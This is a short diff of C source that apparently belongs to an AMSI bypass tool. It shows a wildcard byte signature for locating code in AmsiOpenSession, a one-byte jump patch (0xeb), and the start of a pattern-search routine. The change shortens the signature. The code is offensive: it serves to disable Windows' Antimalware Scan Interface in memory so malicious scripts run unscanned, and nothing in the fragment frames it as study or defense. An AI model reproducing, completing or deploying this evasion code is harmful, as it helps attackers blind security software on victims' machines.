@@ -2,7 +2,7 @@
 
 typedef HRESULT(WINAPI* AMSIOPENSESSION)(HAMSICONTEXT, HAMSISESSION*);
 
-BYTE AmsiPattern[] = { 0x48,'?','?', 0x74,'?',0x48,'?' ,'?' ,0x74,'?' ,0x48,'?' ,'?' ,'?' ,'?',0x74,0x33 };
+BYTE AmsiPattern[] = { 0x48,'?','?', 0x74,'?',0x48,'?' ,'?' ,0x74 };
 UCHAR AmsiPatch[] = { 0xeb };
 
 ULONGLONG UnusedSubroutineSearchAmsiPattern(PBYTE Address, DWORD Size, PBYTE Pattern, DWORD PatternSize)
